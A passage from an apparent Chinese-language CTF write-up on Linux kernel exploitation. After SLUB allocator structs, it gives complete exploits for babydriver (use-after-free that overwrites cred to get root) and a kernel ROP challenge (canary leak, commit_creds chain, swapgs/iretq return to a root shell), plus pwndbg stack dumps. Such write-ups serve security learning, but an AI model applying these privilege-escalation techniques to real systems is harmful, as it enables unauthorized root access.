class="line">        </span><br><span class="line">	<span class="comment">/*每个node对应一个数组项，kmem_cache_node中包含partial slab链表*/</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line">    	<span class="comment">/*指向下面page指向的slab中的第一个free object*/</span></span><br><span class="line">        <span class="type">void</span> **freelist;      </span><br><span class="line">    	<span class="comment">/* Globally unique transaction id */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> tid;      </span><br><span class="line">    	<span class="comment">/*指向当前正在使用的slab*/</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span>      </span><br><span class="line">	<span class="comment">/*本地slab缓存池中的partial slab链表*/</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">partial</span>;</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line">    	<span class="comment">/*kmem_cache_node数据结构的自选锁，可能涉及到多核访问*/</span></span><br><span class="line">        <span class="type">spinlock_t</span> list_lock;</span><br><span class="line">    	<span class="comment">/*node中slab的数量*/</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> nr_partial;</span><br><span class="line">    	<span class="comment">/*指向partial slab链表*/</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="CTF真题操练"><a href="#CTF真题操练" class="headerlink" title="CTF真题操练"></a>CTF真题操练</h1><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>ciscn2017-babydriver</p>
<p>没有用户态传统的溢出等漏洞，但是存在一个为条件竞争引发的UAF漏洞</p>
<p>如果我们两次打开同一个设备，因为babydev_struct是全局的，第二次会覆盖掉第一次分配的空间。通样释放也是两个一起</p>
<p>通过UAF主要还是用来是修改cred结构体。修改uid,gid</p>
<p>当然，每一种情况都应当有独立的判断</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<p>可以看到，init操作除了flag的权限设置，基本没什么安排特别的保护。</p>
<p>3</p>
<p>exp</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;stdlib.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;unistd.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;fcntl.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;stropts.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;sys/wait.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;sys/stat.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	int fd1 = open(&quot;/dev/babydev&quot;,2);//O_RDWR</span><br><span class="line">	int fd2 = open(&quot;/dev/babydev&quot;,2);</span><br><span class="line">	ioctl(fd1,0x10001,0xa8);</span><br><span class="line"></span><br><span class="line">	close(fd1);</span><br><span class="line">	int pid = fork();</span><br><span class="line">	if(pid &lt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">		puts(&quot;[*] fork err!&quot;);</span><br><span class="line"></span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">	else if (pid == 0 )</span><br><span class="line">	&#123;</span><br><span class="line">		char zeros[30] = &#123;0&#125;;</span><br><span class="line">		write(fd2,zeros,28);</span><br><span class="line"></span><br><span class="line">		if(getuid() == 0)</span><br><span class="line">		&#123;</span><br><span class="line">			puts(&quot;[+] root now&quot;);</span><br><span class="line">			system(&quot;/bin/sh;&quot;);</span><br><span class="line">			exit(0);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		wait(NULL);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd2);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实，如果单看别人，整个逻辑都还能理解，但是里面其实有很多细节，在我看到的众多博客都是以这道题做的基础讲解，基本上都能把原理说通。但是…..</p>
<p>比如说</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char zeros[30] = &#123;0&#125;;</span><br><span class="line">write(fd2,zeros,28);</span><br></pre></td></tr></table></figure>

<p>这一段，就没说，知道作用，但是没说为什么这么大</p>
<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc exp.c -static -masm=intel -g -o exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>,prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;<span class="comment">//it is the base_addr if there is no kaslr protect.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="comment">//read the addr of the func_s</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[*] open kallsyms error!\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)<span class="comment">//strstr ==&gt; search for the chars</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;<span class="comment">//store the func_addr with hex</span></span><br><span class="line">			<span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);<span class="comment">//copy the addr from buf to hex</span></span><br><span class="line">			<span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);<span class="comment">//write the addr into the &amp;commit_creds(from chars to hex_num)</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;<span class="comment">//we could calc out the vmlinux_base from the func_addr</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr : %p\n&quot;</span>,vmlinux_base);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>( <span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>)  &amp;&amp; !prepare_kernel_cred) <span class="comment">//</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">			<span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">			<span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr : %p \n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">			vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(! (prepare_kernel_cred &amp; commit_creds) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[*] Error!&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	__asm__(<span class="string">&quot;mov user_cs,cs;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_ss,ss;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">			<span class="string">&quot;pushf;&quot;</span></span><br><span class="line">			<span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">			);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;[*] status has been ssaved!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd,<span class="type">long</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] set off to %ld\n&quot;</span>,idx);</span><br><span class="line">	ioctl(fd,<span class="number">0x6677889c</span>,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd ,<span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;[*] read to buf\n&quot;</span>);</span><br><span class="line">	ioctl(fd,<span class="number">0x6677889b</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd,<span class="type">long</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] copy from user with size:%ld\n&quot;</span>,size);</span><br><span class="line">	ioctl(fd,<span class="number">0x6677889a</span>,size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	save_status();</span><br><span class="line">	<span class="type">int</span> fd  = open(<span class="string">&quot;/proc/core&quot;</span>,<span class="number">2</span>);<span class="comment">//O_WR</span></span><br><span class="line">	<span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[*] open /proc/core error!\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	find_symbols();</span><br><span class="line">	<span class="comment">//gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line">	<span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">	set_off(fd,<span class="number">0x40</span>);<span class="comment">//////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	core_read(fd,buf);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> canary  = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">	<span class="comment">//size_t canary  = (size_t *)(buf[0]); wrong way</span></span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> canary_ptr  = (<span class="type">size_t</span> *)(canary);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">10</span> ; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		rop[i] = canary;<span class="comment">//overflow the canary and the ebp</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//the least of the chain is rop we </span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)   </span></span><br><span class="line">    <span class="comment">//the value ret will be stored in rax</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//the rdx is &quot;pop rcx; ret&quot;</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//the rcx is &quot;&amp;commit_creds&quot;</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    write(fd,rop,<span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd,<span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>wiki上关于ropchian的注释，有点让人容易误解。我感觉这才是这种构建ropchain的栈题最难的部分。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp   0xffffb3eb00223e18 ◂— add    byte ptr [rcx], ch /* 0x9cf8d7478bd12900 */</span><br><span class="line">... ↓          9 skipped</span><br><span class="line">0a:0050│       0xffffb3eb00223e68 —▸ 0xffffffff8b200b2f ◂— pop    rdi</span><br><span class="line">0b:0058│       0xffffb3eb00223e70 ◂— 0</span><br><span class="line">0c:0060│       0xffffb3eb00223e78 —▸ 0xffffffff8b29cce0 ◂— push   rbp</span><br><span class="line">0d:0068│       0xffffb3eb00223e80 —▸ 0xffffffff8b2a0f49 ◂— pop    rdx</span><br><span class="line">0e:0070│       0xffffb3eb00223e88 —▸ 0xffffffff8b221e53 ◂— pop    rcx</span><br><span class="line">0f:0078│       0xffffb3eb00223e90 —▸ 0xffffffff8b21aa6a ◂— mov    rdi, rax</span><br><span class="line">10:0080│       0xffffb3eb00223e98 —▸ 0xffffffff8b29c8e0 ◂— push   r12</span><br><span class="line">11:0088│       0xffffb3eb00223ea0 —▸ 0xffffffff8bc012da ◂— swapgs</span><br><span class="line">12:0090│ rdi-4 0xffffb3eb00223ea8 ◂— 0</span><br><span class="line">13:0098│       0xffffb3eb00223eb0 —▸ 0xffffffff8c456968 —▸ 0xffffffff8c98af50 ◂— push   -0x73ba97 /* 0xffffffff8c456968 */</span><br><span class="line">14:00a0│       0xffffb3eb00223eb8 ◂— 0x6677889a</span><br><span class="line">15:00a8│       0xffffb3eb00223ec0 —▸ 0xffff9a013f460100 ◂— 0</span><br><span class="line">16:00b0│       0xffffb3eb00223ec8 ◂— add    byte ptr [rcx], al /* 0xffffffffffff0100 */</span><br><span class="line">17:00b8│       0xffffb3eb00223ed0 ◂— add    byte ptr [rcx], al /* 0xffffffffffff0100 */</span><br><span class="line">18:00c0│       0xffffb3eb00223ed8 —▸ 0xffff9a013f460100 ◂— 0</span><br><span class="line">19:00c8│       0xffffb3eb00223ee0 —▸ 0xffff9a013f460100 ◂— 0</span><br><span class="line">1a:00d0│       0xffffb3eb00223ee8 ◂— 3</span><br><span class="line">1b:00d8│       0xffffb3eb00223ef0 ◂— 0x6677889a</span><br><span class="line">1c:00e0│       0xffffb3eb00223ef8 ◂— add    byte ptr [rcx], al /* 0xffffffffffff0100 */</span><br><span class="line">1d:00e8│       0xffffb3eb00223f00 —▸ 0xffffffff8b38f28f ◂— jmp    0xffffffff8b38f258</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp 0xffffb0d800233e70 ◂— 0</span><br><span class="line">01:0008│     0xffffb0d800233e78 —▸ 0xffffffffab09cce0 ◂— push   rbp</span><br><span class="line">02:0010│     0xffffb0d800233e80 —▸ 0xffffffffab0a0f49 ◂— pop    rdx</span><br><span class="line">03:0018│     0xffffb0d800233e88 —▸ 0xffffffffab021e53 ◂— pop    rcx</span><br><span class="line">04:0020│     0xffffb0d800233e90 —▸ 0xffffffffab01aa6a ◂— mov    rdi, rax</span><br><span class="line">05:0028│     0xffffb0d800233e98 —▸ 0xffffffffab09c8e0 ◂— push   r12</span><br><span class="line">06:0030│     0xffffb0d800233ea0 —▸ 0xffffffffaba012da ◂— swapgs </span><br><span class="line">07:0038│     0xffffb0d800233ea8 ◂— 0</span><br><span class="line">───────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 0xffffffffab000b2f</span><br><span class="line">   f 1              0x0</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; tele 0xffffffffab01aa6a</span><br><span class="line">00:0000│  0xffffffffab01aa6a ◂— mov    rdi, rax</span><br><span class="line">01:0008│  0xffffffffab01aa72 ◂— mov    rax, qword ptr [rbx]</span><br><span class="line">02:0010│  0xffffffffab01aa7a ◂— call   0xffffffffab86be50</span><br><span class="line">03:0018│  0xffffffffab01aa82 ◂— or     byte ptr [rcx], dh</span><br><span class="line">04:0020│  0xffffffffab01aa8a ◂— pop    rbp</span><br><span class="line">05:0028│  0xffffffffab01aa92 ◂— nop    dword ptr [rax]</span><br><span class="line">06:0030│  0xffffffffab01aa9a ◂— test   byte ptr [rax], al</span><br><span class="line">07:0038│  0xffffffffab01aaa2 ◂— nop    dword ptr [rax]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

